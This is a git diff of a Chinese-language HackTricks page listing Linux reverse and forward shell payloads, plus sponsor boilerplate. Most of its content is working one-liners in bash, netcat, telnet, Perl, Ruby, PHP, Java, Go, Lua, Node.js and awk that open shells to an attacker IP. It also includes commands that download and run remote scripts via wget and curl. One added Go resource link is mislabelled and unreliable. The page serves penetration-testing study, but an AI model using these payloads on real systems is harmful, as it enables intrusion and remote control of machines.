@@ -8,7 +8,7 @@
 
 * 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
+* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
 * **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
@@ -16,17 +16,17 @@
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 ***
 
-**如果您对这些shell有任何疑问，可以使用** [**https://explainshell.com/**](https://explainshell.com) **进行检查**
+**如果您对这些shell有任何疑问，可以使用** [**https://explainshell.com/**](https://explainshell.com) **进行检查。**
 
 ## Full TTY
 
-**一旦获得反向shell**[ **阅读此页面以获取完整的TTY**](full-ttys.md)**。**
+**一旦获得反向shell，请阅读[**此页面以获取完整的TTY**](full-ttys.md)**。**
 
 ## Bash | sh
 ```bash
@@ -65,11 +65,11 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## 正向 Shell
 
-在处理基于 Linux 的 Web 应用中的 **远程代码执行 (RCE)** 漏洞时，通过反向 shell 可能会受到像 iptables 规则或复杂的数据包过滤机制等网络防御的阻碍。在这种受限制的环境中，一种替代方法是建立一个 PTY（伪终端）shell，以更有效地与受损系统进行交互。
+在处理基于 Linux 的 Web 应用中的 **远程代码执行 (RCE)** 漏洞时，通过网络防御措施如 iptables 规则或复杂的数据包过滤机制可能会阻碍反向 shell 的获取。在这种受限环境中，一种替代方法是建立一个 PTY (伪终端) shell，以更有效地与受损系统进行交互。
 
 一个推荐的工具是 [toboggan](https://github.com/n3rada/toboggan.git)，它简化了与目标环境的交互。
 
-要有效地利用 toboggan，创建一个针对目标系统 RCE 上下文的 Python 模块。例如，一个名为 `nix.py` 的模块可以按以下结构组织：
+要有效地利用 toboggan，创建一个针对目标系统 RCE 上下文的 Python 模块。例如，一个名为 `nix.py` 的模块可以按以下结构设置：
 ```python3
 import jwt
 import httpx
@@ -107,7 +107,7 @@ toboggan -m nix.py -i
 - 您的有效负载的前缀和后缀（如果有的话）
 - 发送有效负载的方式（头部？数据？额外信息？）
 
-然后，您可以**发送命令**，甚至**使用`upgrade`命令**来获得完整的PTY（请注意，管道的读取和写入存在大约1.3秒的延迟）。
+然后，您可以**发送命令**，甚至**使用`upgrade`命令**来获得完整的PTY（请注意，管道的读取和写入会有大约1.3秒的延迟）。
 
 ## Netcat
 ```bash
@@ -119,13 +119,13 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 ```
 ## gsocket
 
-在 [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/) 进行检查
+在[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)中查看
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet（Telnet）是一种用于远程登录的协议。 Telnet客户端通过Telnet协议连接到Telnet服务器，允许用户在远程计算机上执行操作。 Telnet协议在未加密的情况下传输数据，因此不建议在不安全的网络上使用。
+Telnet是一种用于远程登录的协议，可通过命令行连接到远程计算机。 Telnet不加密数据传输，因此不安全，建议使用SSH等更安全的替代方案。
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -138,9 +138,9 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```bash
 while true; do nc -l <port>; done
 ```
-将命令写下来，按回车，然后按CTRL+D（停止STDIN）
-
 **受害者**
+
+要发送命令，请将其写下，按Enter，然后按CTRL+D（停止STDIN）
 ```bash
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
 ```
@@ -156,14 +156,14 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 ```
 ## Perl
 
-Perl是一种流行的脚本编程语言，广泛用于系统管理、文本处理和网络编程。Perl脚本通常以.pl为扩展名。Perl脚本可以在Linux系统上运行，并且可以通过命令行解释器直接执行。Perl提供了丰富的内置函数和模块，使其成为处理文本数据和执行系统管理任务的强大工具。
+Perl是一种流行的脚本语言，通常用于文本处理和系统管理任务。Perl脚本可以在Linux系统上运行，并且可以通过网络连接进行交互。Perl脚本通常以.pl为扩展名。
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
 
-## Ruby
+Ruby是一种灵活且简单易学的编程语言，常用于编写脚本和Web应用程序。Ruby的一个强大功能是元编程，允许程序在运行时修改自身结构。Ruby还有一个庞大的社区，提供了许多有用的库和工具，使开发人员能够快速构建功能强大的应用程序。
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -184,7 +184,7 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 ## Java
 
-Java是一种通用编程语言，广泛用于开发各种类型的应用程序。 Java程序可以在各种操作系统上运行，因为它是一种跨平台语言。 Java程序通常在Java虚拟机（JVM）上运行，这使得它们具有良好的可移植性和安全性。 Java也被广泛用于Web开发，企业应用程序和移动应用程序开发。
+## Java
 ```bash
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
@@ -192,20 +192,29 @@ p.waitFor()
 ```
 ## Ncat
 
-Ncat是一个强大的网络工具，可以用于连接、侦听、端口转发和数据传输。
+Ncat是一个功能强大的网络工具，可以用于连接、侦听、端口扫描和数据传输。
 ```bash
 victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
 ## Golang
 
-## Golang
+### Reverse Shell
+
+#### Description
+
+The Go programming language, also known as Golang, is a powerful tool for creating reverse shells due to its cross-platform support and efficiency. Reverse shells written in Golang can be compiled for various operating systems and architectures, making them versatile for penetration testing and red teaming activities.
+
+#### Resources
+
+- [Golang Reverse Shell](https://github.com/fatih/color)
+- [Golang Cross Compilation](https://github.com/mitchellh/gox)
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 ## Lua
 
-## Lua
+Lua是一种轻量级、高效的脚本语言，常用于嵌入式系统和游戏开发中。 Lua脚本可以通过解释器执行，也可以编译成字节码运行。 Lua具有简洁的语法和强大的扩展能力，支持面向过程、函数式和面向对象的编程范式。 Lua还提供了丰富的标准库和第三方库，方便开发人员快速实现各种功能。 Lua脚本可以与C/C++等语言轻松集成，使其在各种应用场景中得到广泛应用。
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -214,7 +223,7 @@ lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket")
 ```
 ## NodeJS
 
-NodeJS是一个基于Chrome V8引擎的JavaScript运行环境。
+NodeJS是一个基于Chrome V8引擎的JavaScript运行环境。它允许在服务器端运行JavaScript代码，提供了丰富的库和模块，使开发人员能够轻松构建高性能的网络应用程序。
 ```javascript
 (function(){
 var net = require("net"),
@@ -299,9 +308,9 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-**受害者**
+将命令写下来，按回车，然后按CTRL+D（停止STDIN）
 
-要发送命令，请将其写下，按Enter，然后按CTRL+D（停止STDIN）
+**受害者**
 ```bash
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done
 
@@ -363,7 +372,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -376,7 +385,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 * 如果您想在HackTricks中看到您的**公司广告**或**下载PDF版本的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
 * 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**telegram群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
